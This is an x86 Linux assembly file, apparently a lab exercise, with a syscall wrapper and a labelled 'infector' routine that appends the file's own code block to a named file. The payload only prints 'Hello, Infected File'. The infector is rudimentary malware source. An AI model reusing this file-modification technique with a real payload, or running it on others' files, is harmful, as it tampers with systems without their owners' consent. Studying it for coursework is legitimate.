section .text
    global _start
    global system_call
    global infection
    global infector
    global code_start
    global code_end
    extern main

; ==============================================================================
; PROGRAM ENTRY POINT
; ==============================================================================
_start:
    pop    eax
    mov    ecx, esp
    push   ecx
    push   eax
    call   main
    mov    ebx, eax
    mov    eax, 1
    int    0x80

; ==============================================================================
; GENERIC C SYSTEM CALL WRAPPER
; ==============================================================================
system_call:
    push    ebp
    mov     ebp, esp
    pushad
    mov     eax, [ebp+8]
    mov     ebx, [ebp+12]
    mov     ecx, [ebp+16]
    mov     edx, [ebp+20]
    int     0x80
    
    mov     [esp + 28], eax
    popad
    pop     ebp
    ret

; ==============================================================================
; INFECTION PAYLOAD ROUTINE
; ==============================================================================
code_start:
infection:
    pushad
    mov eax, 4
    mov ebx, 1
    mov ecx, inf_msg
    mov edx, 21
    int 0x80
    popad
    ret

inf_msg: db "Hello, Infected File", 10

; ==============================================================================
; FILE INJECTOR ROUTINE
; ==============================================================================
infector:
    push    ebp
    mov     ebp, esp
    pushad

    mov     ebx, [ebp+8]
    
    mov     eax, 5
    mov     ecx, 1025
    mov     edx, 0644Q
    int     0x80
    
    cmp     eax, 0
    jl      .error

    mov     ebx, eax
    mov     eax, 4
    mov     ecx, code_start
    mov     edx, code_end
    sub     edx, ecx
    int     0x80

    mov     eax, 6
    int     0x80

    popad
    pop     ebp
    ret

.error:
    mov     eax, 4
    mov     ebx, 1
    mov     ecx, error_message
    mov     edx, 23
    int     0x80

    mov     eax, 1
    mov     ebx, 0x55
    int     0x80

error_message: db "Failed to attach VIRUS", 10
code_end: